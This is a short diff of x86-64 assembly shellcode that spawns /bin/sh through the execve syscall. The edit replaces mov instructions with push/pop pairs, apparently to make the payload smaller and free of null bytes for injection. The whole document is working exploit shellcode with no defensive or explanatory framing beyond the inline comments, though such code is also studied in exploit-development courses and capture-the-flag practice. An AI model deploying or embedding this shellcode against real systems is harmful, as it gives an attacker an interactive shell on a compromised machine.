@@ -8,11 +8,15 @@ section .text
       
 _start:
     xor rdi,rdi     ; rdi null
-    mov rsi,rdi     ; argv null
-    mov rdx,rdi     ; envp null
+    push rdi        ; null
+    push rdi        ; null
+    pop rsi         ; argv null
+    pop rdx         ; envp null
     mov rdi,0x68732f6e69622f2f ; hs/nib//
     shr rdi,0x08    ; no nulls, so shr to get \0
     push rdi        ; \0hs/nib/
-    mov rdi,rsp     ; pointer to arguments
-    mov rax,0x3b    ; execve
+    push rsp       
+    pop rdi         ; pointer to arguments
+    push 0x3b       ; execve
+    pop rax          
     syscall         ; make the call
